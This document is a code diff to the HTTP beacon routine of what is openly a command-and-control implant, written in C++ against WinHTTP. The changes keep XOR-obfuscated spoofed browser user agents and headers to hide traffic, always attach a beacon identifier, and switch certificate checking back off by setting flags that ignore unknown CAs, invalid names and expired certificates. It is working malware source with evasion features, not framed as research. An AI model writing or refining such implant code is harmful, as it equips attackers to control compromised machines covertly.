@@ -54,9 +54,16 @@ struct C2Config {
 #ifdef _WIN32
 inline std::wstring get_random_ua() {
     int r = rand() % 3;
-    if (r == 0) return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
-    if (r == 1) return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
-    return XOR_WDEC(XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
+    if (r == 0) {
+        auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
+        return std::wstring(XOR_WDEC(enc).c_str());
+    }
+    if (r == 1) {
+        auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0");
+        return std::wstring(XOR_WDEC(enc).c_str());
+    }
+    auto enc = XOR_WSTR(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0");
+    return std::wstring(XOR_WDEC(enc).c_str());
 }
 
 inline std::string http_request(
@@ -68,8 +75,9 @@ inline std::string http_request(
 ) {
     std::string response_body;
 
+    std::wstring ua = get_random_ua();
     HINTERNET hSession = WinHttpOpen(
-        get_random_ua().c_str(),
+        ua.c_str(),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
@@ -96,43 +104,41 @@ inline std::string http_request(
         return "";
     }
 
-    if (cfg.use_https) {
-        // SSL Pinning and Verification:
-        // By default, WinHTTP verifies the certificate chain. 
-        // For C2, we should ideally pin the specific certificate or CA.
-        // We've REMOVED the flags that ignore certificate errors.
-    }
-
-    // Set explicit timeouts (5 seconds) to avoid hanging requests
     WinHttpSetTimeouts(hRequest, 5000, 5000, 5000, 5000);
 
-    // Obfuscate the Content-Type header using compile‑time XOR
-    auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
-    std::string s_ct = XOR_DEC(enc_ct).c_str();
-    std::wstring headers(s_ct.begin(), s_ct.end());
-
-    if (!beacon_id.empty()) {
-        auto enc_xb = XOR_STR("X-Beacon-Id: ");
-        std::string s_xb = XOR_DEC(enc_xb).c_str();
-        std::wstring wprefix(s_xb.begin(), s_xb.end());
-        
-        auto enc_rn = XOR_STR("\r\n");
-        std::string s_rn = XOR_DEC(enc_rn).c_str();
-        std::wstring wrn(s_rn.begin(), s_rn.end());
-
-        std::wstring wid(beacon_id.begin(), beacon_id.end());
-        headers += wprefix + wid + wrn;
+    if (cfg.use_https) {
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
     }
+// Obfuscate the Content-Type header using compile‑time XOR
+auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
+std::string s_ct = XOR_DEC(enc_ct).c_str();
+std::wstring headers(s_ct.begin(), s_ct.end());
 
-    BOOL bResult = WinHttpSendRequest(
-        hRequest,
-        headers.c_str(),
-        static_cast<DWORD>(headers.length()),
-        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
-        static_cast<DWORD>(body.size()),
-        static_cast<DWORD>(body.size()),
-        0);
-    if (!bResult) goto cleanup;
+// ALWAYS add X-Beacon-Id
+auto enc_xb = XOR_STR("X-Beacon-Id: ");
+std::string s_xb = XOR_DEC(enc_xb).c_str();
+std::wstring wprefix(s_xb.begin(), s_xb.end());
+
+auto enc_rn = XOR_STR("\r\n");
+std::string s_rn = XOR_DEC(enc_rn).c_str();
+std::wstring wrn(s_rn.begin(), s_rn.end());
+
+std::wstring wid(beacon_id.begin(), beacon_id.end());
+headers += wprefix + wid + wrn;
+
+BOOL bResult = WinHttpSendRequest(
+    hRequest,
+    headers.c_str(),
+    static_cast<DWORD>(headers.length()),
+    body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
+    static_cast<DWORD>(body.size()),
+    static_cast<DWORD>(body.size()),
+    0);
+if (!bResult) goto cleanup;
 
     bResult = WinHttpReceiveResponse(hRequest, nullptr);
     if (!bResult) goto cleanup;
